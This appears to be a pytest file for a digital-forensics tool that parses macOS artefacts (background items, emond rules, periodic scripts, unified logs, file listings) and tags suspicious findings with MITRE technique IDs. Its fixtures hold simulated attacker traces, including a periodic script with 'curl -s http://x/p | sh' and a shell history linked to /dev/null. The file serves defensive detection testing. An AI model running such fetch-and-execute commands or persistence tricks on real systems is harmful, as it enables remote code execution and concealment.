"""macOS artefacts in raw/macos/ (process/mac_artefacts.py)."""
import csv
import json
import plistlib
import sqlite3
import struct
import sys
from pathlib import Path

# Appended, not prepended, as it always was (src/analysis/platform shadowed the stdlib module until it became platform_adapters).
sys.path.append(str(Path(__file__).resolve().parents[2] / "src" / "analysis"))

from rowanholt.core.records import check_file, own_fields, read_records  # noqa: E402
from rowanholt.process import mac_artefacts as ma  # noqa: E402


def host(tmp_path):
    raw = tmp_path / "out" / "HOST" / "artefacts" / "raw"
    (raw / "macos").mkdir(parents=True)
    return str(tmp_path / "out") + "/", raw / "macos"


def run(out, artefact):
    return ma.process_mac_artefact("", "'HOST'", out, "HOST::macOS", "/", "processing", str(artefact))


def rows(out, name):
    """A cooked table's rows as Elrond wrote them (JSON Lines), without the envelope; every record
    checked for it first."""
    path = Path(out) / "HOST" / "artefacts" / "cooked" / f"{name}.jsonl"
    assert check_file(path) == []
    return [own_fields(r) for _, r in read_records(path)]


def techniques(out):
    path = Path(out) / "mitre_techniques.txt"
    return path.read_text().split() if path.exists() else []


class Archive:
    """Builds an NSKeyedArchiver plist."""

    def __init__(self):
        self.objects = ["$null"]

    def add(self, value):
        self.objects.append(value)
        return plistlib.UID(len(self.objects) - 1)

    def cls(self, name):
        return self.add({"$classname": name, "$classes": [name, "NSObject"]})

    def string(self, text):
        return self.add(text)

    def url(self, text):
        return self.add({"$class": self.cls("NSURL"), "NS.base": plistlib.UID(0), "NS.relative": self.string(text)})

    def array(self, items):
        return self.add({"$class": self.cls("NSArray"), "NS.objects": items})

    def dictionary(self, mapping):
        return self.add({"$class": self.cls("NSDictionary"), "NS.keys": [self.string(k) for k in mapping],
                         "NS.objects": list(mapping.values())})

    def dump(self, root):
        return plistlib.dumps({"$version": 100000, "$archiver": "NSKeyedArchiver", "$top": {"root": root},
                               "$objects": self.objects}, fmt=plistlib.FMT_BINARY)


def bookmark(path):
    """A minimal 'book' blob holding path components under TOC key 0x1004."""
    data, offsets = b"\0\0\0\0", []
    for part in path.strip("/").split("/"):
        raw = part.encode()
        offsets.append(len(data))
        data += struct.pack("<II", len(raw), 0x0101) + raw + b"\0" * (-len(raw) % 4)
    array_offset = len(data)
    data += struct.pack("<II", 4 * len(offsets), 0x0601) + b"".join(struct.pack("<I", o) for o in offsets)
    toc_offset = len(data)
    data += struct.pack("<IIIII", 20, 0xFFFFFFFE, 1, 0, 1) + struct.pack("<III", 0x1004, array_offset, 0)
    data = struct.pack("<I", toc_offset) + data[4:]
    header = b"book" + struct.pack("<III", 0x30 + len(data), 0x10040000, 0x30) + b"\0" * 32
    return header + data


def test_bookmark_path():
    assert ma.bookmark_path(bookmark("/Users/bob/Documents/plan.pdf")) == "/Users/bob/Documents/plan.pdf"
    assert ma.bookmark_path(b"not a bookmark") == ""


def test_btm_items(tmp_path):
    out, macos = host(tmp_path)
    a = Archive()
    item_class = a.cls("ItemRecord")
    apple = a.add({"$class": item_class, "name": a.string("Siri"), "identifier": a.string("com.apple.Siri.agent"),
                   "type": 8, "disposition": 3, "url": a.url("file:///System/Library/LaunchAgents/com.apple.Siri.plist"),
                   "teamIdentifier": a.string("")})
    agent = a.add({"$class": item_class, "name": a.string("Updater"), "identifier": a.string("com.lab.updater"),
                   "type": 8, "disposition": 11, "url": a.url("file:///Library/LaunchAgents/com.lab.updater.plist"),
                   "executablePath": a.string("/tmp/.x/update.sh"), "teamIdentifier": a.string("LAB123"),
                   "developerName": a.string("Lab")})
    login = a.add({"$class": item_class, "name": a.string("Helper"), "identifier": a.string("com.lab.helper"),
                   "type": 4, "disposition": 2, "url": a.url("file:///Applications/Helper.app/"),
                   "teamIdentifier": a.string("LAB123")})
    store = a.dictionary({"itemsByUserIdentifier": a.dictionary({"uuid-1": a.array([apple, agent, login])})})
    name = "private+var+db+com.apple.backgroundtaskmanagement+BackgroundItems-v13.btm"
    (macos / name).write_bytes(a.dump(store))
    assert run(out, macos / name) is True
    found = rows(out, "btm_items")
    assert [(r["Identifier"], r["Enabled"], r["Flag"]) for r in found] == [
        ("com.apple.Siri.agent", "yes", ""), ("com.lab.updater", "yes", "third party; suspicious path"),
        ("com.lab.helper", "no", "third party")]
    assert found[1]["URL"] == "file:///Library/LaunchAgents/com.lab.updater.plist"
    assert techniques(out) == ["T1543.001"]


def test_shared_file_list(tmp_path):
    out, macos = host(tmp_path)
    a = Archive()
    entry = a.dictionary({"Name": a.string("plan.pdf"), "Bookmark": a.add(bookmark("/Users/bob/Documents/plan.pdf"))})
    root = a.dictionary({"items": a.array([entry])})
    name = "Users+bob+Library+Application Support+com.apple.sharedfilelist+com.apple.LSSharedFileList.RecentDocuments.sfl3"
    (macos / name).write_bytes(a.dump(root))
    run(out, macos / name)
    found = rows(out, "shared_file_lists")
    assert found == [{"Source": "/Users/bob/Library/Application Support/com.apple.sharedfilelist/"
                                "com.apple.LSSharedFileList.RecentDocuments.sfl3",
                      "List": "com.apple.LSSharedFileList.RecentDocuments.sfl3", "Name": "plan.pdf",
                      "Path": "/Users/bob/Documents/plan.pdf"}]


def test_notifications_read_the_wal(tmp_path):
    out, macos = host(tmp_path)
    db_path = macos / "Users+bob+Library+Group Containers+group.com.apple.usernoted+db2+db"
    db = sqlite3.connect(db_path)
    db.execute("PRAGMA journal_mode=WAL")
    db.execute("CREATE TABLE app(app_id INTEGER PRIMARY KEY, identifier TEXT)")
    db.execute("CREATE TABLE record(rec_id INTEGER PRIMARY KEY, app_id INTEGER, data BLOB, delivered_date REAL)")
    db.execute("INSERT INTO app VALUES (1, 'com.tinyspeck.slackmacgap')")
    payload = plistlib.dumps({"app": "com.tinyspeck.slackmacgap", "req": {"titl": "alice", "body": "the VPN creds"}},
                             fmt=plistlib.FMT_BINARY)
    db.execute("INSERT INTO record VALUES (1, 1, ?, 783000000.0)", (payload,))
    db.commit()
    wal = Path(str(db_path) + "-wal")
    assert wal.exists() and wal.stat().st_size > 0  # the row is only in the WAL
    copy = macos / "copy"
    copy.mkdir()
    for f in (db_path, wal):
        (copy / f.name).write_bytes(f.read_bytes())
    db.close()
    target = copy / db_path.name
    run(out, target)
    assert run(out, Path(str(target) + "-wal")) is True
    found = rows(out, "notifications")
    assert len(found) == 1 and found[0]["App"] == "com.tinyspeck.slackmacgap" and found[0]["Body"] == "the VPN creds"
    assert found[0]["LastWriteTime"].startswith("2025-")


def test_policy_databases(tmp_path):
    out, macos = host(tmp_path)
    exec_db = macos / "private+var+db+SystemPolicyConfiguration+ExecPolicy"
    db = sqlite3.connect(exec_db)
    db.execute("CREATE TABLE executable_measurements_v2(file_identifier TEXT, signing_identifier TEXT, is_quarantined INT)")
    db.execute("INSERT INTO executable_measurements_v2 VALUES ('/Users/bob/Downloads/x', 'x', 1)")
    db.execute("CREATE TABLE settings(name TEXT, value TEXT)")
    db.commit(); db.close()
    kext_db = macos / "private+var+db+SystemPolicyConfiguration+KextPolicy"
    db = sqlite3.connect(kext_db)
    db.execute("CREATE TABLE kext_load_history_v3(path TEXT, team_id TEXT, bundle_id TEXT)")
    db.execute("INSERT INTO kext_load_history_v3 VALUES ('/Library/Extensions/lab.kext', 'LAB123', 'com.lab.kext')")
    db.commit(); db.close()
    run(out, exec_db)
    run(out, kext_db)
    assert rows(out, "execpolicy_executable_measurements_v2")[0]["file_identifier"] == "/Users/bob/Downloads/x"
    assert not (Path(out) / "HOST" / "artefacts" / "cooked" / "execpolicy_settings.csv").exists()
    assert rows(out, "kextpolicy_kext_load_history_v3")[0]["bundle_id"] == "com.lab.kext"
    assert "T1547.006" in techniques(out)


def test_emond_and_periodic(tmp_path):
    out, macos = host(tmp_path)
    rule = [{"name": "lab", "enabled": True, "criterion": [{"eventType": "startup"}],
             "actions": [{"type": "RunCommand", "command": "/tmp/.x/update.sh", "arguments": ["-q"]}]}]
    (macos / "private+etc+emond.d+rules+lab.plist").write_bytes(plistlib.dumps(rule))
    (macos / "private+etc+emond.d+rules+SampleRules.plist").write_bytes(plistlib.dumps([{"name": "s", "enabled": False}]))
    (macos / "private+etc+daily.local").write_text("# local\n/usr/local/bin/backup\n")
    (macos / "private+etc+periodic+daily+999.lab").write_text("#!/bin/sh\necho ok\ncurl -s http://x/p | sh\n")
    for name in ("private+etc+emond.d+rules+lab.plist", "private+etc+emond.d+rules+SampleRules.plist",
                 "private+etc+daily.local", "private+etc+periodic+daily+999.lab"):
        run(out, macos / name)
    emond = rows(out, "emond_rules")
    assert [(r["Name"], r["Flag"]) for r in emond] == [("lab", "runs on an event"), ("s", "")]
    assert emond[0]["Actions"] == "RunCommand: /tmp/.x/update.sh -q" and emond[0]["Source"] == "/etc/emond.d/rules/lab.plist"
    assert [r["Flag"] for r in rows(out, "periodic")] == ["runs on a schedule or at boot", "suspicious command"]
    assert "T1546.014" in techniques(out)


def test_unified_log_export(tmp_path):
    out, macos = host(tmp_path)
    events = [{"timestamp": "2026-10-26 10:00:00.000000+0000", "processImagePath": "/usr/bin/sudo", "processID": 42,
               "subsystem": "", "category": "", "messageType": "Default",
               "eventMessage": "bob : TTY=ttys000 ; PWD=/ ; USER=root ; COMMAND=/bin/sh"},
              {"count": 1, "finished": 1}]
    (macos / "gandalf+unifiedlog.ndjson").write_text("\n".join(json.dumps(e) for e in events) + "\nnot json\n")
    run(out, macos / "gandalf+unifiedlog.ndjson")
    found = rows(out, "unified_log")
    assert len(found) == 1 and found[0]["Process"] == "/usr/bin/sudo" and "COMMAND=/bin/sh" in found[0]["Message"]


def test_an_applescript_run_is_tagged_from_osascript_or_loginwindows_check_in(tmp_path):
    assert ma.unified_log_technique("/usr/bin/osascript", "CHECKIN: pid=2717") == "T1059.002"
    assert ma.unified_log_technique("/System/Library/CoreServices/loginwindow.app/Contents/MacOS/loginwindow",
                                    "-[ApplicationManager checkInAppContext:eventData:] | ApplicationManager: "
                                    "Checked in app : osascript") == "T1059.002"
    assert ma.unified_log_technique("/usr/bin/sudo", "Reading config") == ""
    out, macos = host(tmp_path)
    event = {"timestamp": "2026-11-10 14:56:55.000000+0000", "processImagePath": "/usr/bin/osascript", "processID": 2717,
             "subsystem": "", "category": "", "messageType": "Default", "eventMessage": "CHECKIN: pid=2717"}
    (macos / "gandalf+unifiedlog.ndjson").write_text(json.dumps(event) + "\n")
    run(out, macos / "gandalf+unifiedlog.ndjson")
    assert rows(out, "unified_log")[0]["Technique"] == "T1059.002"
    assert "T1059.002" in Path(out, "HOST", "artefacts", "cooked", "unified_log.jsonl").read_text()


def test_the_file_listing_flags_keychain_copies_hidden_entries_and_history_links(tmp_path):
    out, macos = host(tmp_path)
    listing = ("Path,Type,Size,Mode,UID,MTime,Target,Kind,FinderHidden\n"
               "/private/tmp/keychain,file,125536,0o644,0,1793000000,,keychain,\n"
               "/Users/admin/Library/Keychains/login.keychain-db,file,125536,0o600,501,1793000000,,keychain,\n"
               "/private/tmp/certs.pem,file,2380,0o644,0,1793000000,,pem-certificate,\n"
               "/private/var/tmp/.hidden-directory,directory,1,0o755,0,1793000000,,,\n"
               "/Users/Shared/.localized,file,0,0o644,0,1793000000,,,\n"
               "/Users/admin/.bash_history,symlink,0,0o755,0,1793000000,/dev/null,,\n"
               "/Users/admin/notes.txt,file,10,0o644,501,1793000000,,,yes\n"
               "/Users/admin/Library,directory,83,0o700,501,1793000000,,,yes\n"
               "/private/tmp/stage.sh,file,10,0o755,0,1793000000,,script,\n"
               "/Users/admin/T1082.txt,file,10,0o644,0,1793000000,,,\n")
    (macos / "gandalf+file_listing.csv").write_text(listing)
    run(out, macos / "gandalf+file_listing.csv")
    found = {r["Path"]: (r["Flag"], r["Technique"]) for r in rows(out, "file_listing")}
    assert found["/private/tmp/keychain"][1] == "T1555.001"
    assert found["/Users/admin/Library/Keychains/login.keychain-db"] == ("", "")
    assert found["/private/tmp/certs.pem"][1] == "T1555.001"
    assert found["/private/var/tmp/.hidden-directory"][1] == "T1564.001"
    assert found["/Users/Shared/.localized"] == ("", "")
    assert found["/Users/admin/.bash_history"] == ("shell history linked to /dev/null", "T1070.003")
    assert found["/Users/admin/notes.txt"] == ("hidden from the Finder", "T1564.001")
    assert found["/Users/admin/Library"] == ("", "")  # macOS hides it itself
    assert found["/private/tmp/stage.sh"] == ("executable staged in a temp or shared folder", "")
    assert found["/Users/admin/T1082.txt"] == ("", "")
    assert techniques(out) == ["T1070.003", "T1555.001", "T1564.001"]


def test_a_log_erase_is_found_in_logds_own_log(tmp_path):
    out, _ = host(tmp_path)
    diagnostics = Path(out) / "HOST" / "artefacts" / "raw" / "unified_log_store" / "diagnostics"
    diagnostics.mkdir(parents=True)
    (diagnostics / "logd.0.log").write_text("2026-11-10 14:22:41+0000 logd[80]: Periodic complete. Removed 288502537 bytes.\n"
                                            "2026-11-10 14:51:14+0000 logd[80]: All logs erased (mask:7)\n")
    run(out, diagnostics / "logd.0.log")
    found = rows(out, "logd_log")
    assert [r["Flag"] for r in found] == ["", "log store erased"]
    assert found[1]["LastWriteTime"] == "2026-11-10T14:51:14Z" and found[1]["Process"] == "logd"
    assert techniques(out) == ["T1685.006"]


def test_other_plists_fall_through_and_collected_only_files_are_consumed(tmp_path):
    out, macos = host(tmp_path)
    (macos / "Library+Receipts+InstallHistory.plist").write_bytes(plistlib.dumps([{"displayName": "x"}]))
    (macos / "private+var+db+biome+streams+restricted+App.InFocus+local+1").write_bytes(b"SEGB")
    assert run(out, macos / "Library+Receipts+InstallHistory.plist") is False
    assert run(out, macos / "private+var+db+biome+streams+restricted+App.InFocus+local+1") is True
    assert run(out, "/c/HOST/artefacts/raw/plists/x.plist") is False


def test_image_collection(tmp_path):
    from rowanholt.collect import mac as collect_mac

    mnt = tmp_path / "mnt" / "root"
    files = {
        "private/var/db/SystemPolicyConfiguration/ExecPolicy": b"db",
        "private/var/db/SystemPolicyConfiguration/ExecPolicy-wal": b"wal",
        "private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v13.btm": b"btm",
        "private/etc/emond.d/rules/lab.plist": b"plist",
        "Users/bob/Library/Application Support/com.apple.sharedfilelist/x.sfl3": b"sfl",
        "Users/bob/Library/Biome/streams/restricted/App.InFocus/local/1": b"SEGB",
    }
    for rel, data in files.items():
        (mnt / rel).parent.mkdir(parents=True, exist_ok=True)
        (mnt / rel).write_bytes(data)
    dest = str(tmp_path / "out" / "HOST" / "artefacts" / "raw") + "/"
    collect_mac.collect_macos_extras(str(mnt), dest, "HOST::macOS", str(tmp_path / "out") + "/", "collecting", "")
    # and the listing of the temp folders and homes (here, /Users/bob)
    assert sorted(p.name for p in Path(dest, "macos").iterdir()) == sorted(
        [r.replace("/", "+") for r in files] + ["gandalf+file_listing.csv"])
